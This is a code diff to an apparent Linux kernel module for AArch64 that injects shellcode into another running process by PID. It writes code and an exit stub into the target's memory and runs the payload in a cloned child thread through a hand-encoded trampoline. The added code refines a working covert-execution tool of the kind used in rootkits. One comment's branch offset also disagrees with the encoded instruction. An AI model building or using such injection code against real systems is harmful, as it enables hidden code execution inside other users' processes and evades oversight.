@@ -13,6 +13,10 @@
  *   2. Hardcoded shellcode[] below: fallback for testing.
  *
  * Shellcode requirements: AArch64 PIC, ends with  mov x0, #-4; br x28
+ *
+ * Exit stub: an exit(0) stub is appended after the shellcode on the code
+ * page. The clone trampoline sets the child's x28 to point here, so when
+ * the shellcode does "br x28", the child exits cleanly instead of crashing.
  */
 
 #include <linux/module.h>
@@ -79,9 +83,12 @@ static int emit_load_imm64(u32 *buf, int idx, int rd, unsigned long addr)
 }
 
 
-/* Clone trampoline builder */
-
-static int build_trampoline(u32 *buf, unsigned long stack_va)
+/* Clone trampoline builder
+ *
+ * exit_va: address of exit stub on the code page. The child's x28 is set
+ *          to this address so that shellcode's "br x28" exits cleanly.
+ */
+static int build_trampoline(u32 *buf, unsigned long stack_va, unsigned long exit_va)
 {
 	int i = 0;
 	unsigned long stack_top = stack_va + PAGE_SIZE - 16;
@@ -98,10 +105,13 @@ static int build_trampoline(u32 *buf, unsigned long stack_va)
 	buf[i++] = encode_movz(8, 220, 0);            /* x8 = __NR_clone */
 	buf[i++] = encode_svc(0);
 
-	buf[i++] = encode_cbz(0, 3);                  /* cbz x0, child (+3) */
+	buf[i++] = encode_cbz(0, 3);                  /* cbz x0, child (+7) */
 	buf[i++] = encode_movn(0, 3, 0);              /* parent: x0 = ~3 = -4 = -EINTR */
-	buf[i++] = encode_br(28);                     /* parent: br x28 */
-	buf[i++] = encode_br(27);                     /* child:  br x27 */
+	buf[i++] = encode_br(28);                     /* parent: br x28 (original PC) */
+
+	/* child: set x28 = exit stub so shellcode's "br x28" exits cleanly */
+	i = emit_load_imm64(buf, i, 28, exit_va);     /* x28 = exit_stub address */
+	buf[i++] = encode_br(27);                     /* child: br x27 (shellcode) */
 
 	return i;
 }
@@ -230,7 +240,7 @@ int inject_trigger(pid_t target)
 	struct task_struct *task;
 	struct mm_struct *mm;
 	struct pt_regs *regs;
-	unsigned long inject_addr, stack_addr, exec_addr;
+	unsigned long inject_addr, stack_addr, exec_addr, exit_va;
 	void *sc_buf = NULL;
 	size_t sc_len = 0;
 	bool sc_allocated = false;
@@ -286,6 +296,24 @@ int inject_trigger(pid_t target)
 		ret = -EFAULT;
 		goto out_unuse;
 	}
+
+	/* Append exit stub after shellcode on the code page.
+	 * When the child's shellcode does "br x28", it lands here
+	 * and exits cleanly instead of crashing. */
+	exit_va = (inject_addr + sc_len + 3) & ~3UL;  /* align to 4 bytes */
+	{
+		u32 exit_stub[3];
+		exit_stub[0] = encode_movz(8, 93, 0);   /* x8 = __NR_exit */
+		exit_stub[1] = encode_movz(0, 0, 0);    /* x0 = 0 (success) */
+		exit_stub[2] = encode_svc(0);            /* svc #0 */
+
+		if (copy_to_user((void __user *)exit_va, exit_stub, sizeof(exit_stub))) {
+			pr_err("[inject] copy_to_user (exit stub) failed\n");
+			ret = -EFAULT;
+			goto out_unuse;
+		}
+		pr_info("[inject] exit stub at %lx\n", exit_va);
+	}
  
 	stack_addr = vm_mmap(NULL, 0, PAGE_SIZE,
 			    PROT_READ | PROT_WRITE,
@@ -300,7 +328,7 @@ int inject_trigger(pid_t target)
 	kthread_unuse_mm(mm);
 	mmdrop(mm);
  
-	tramp_len = build_trampoline(trampoline, stack_addr);
+	tramp_len = build_trampoline(trampoline, stack_addr, exit_va);
  
 	exec_addr = find_exec_addr(task, tramp_len * sizeof(u32));
 	if (!exec_addr) {
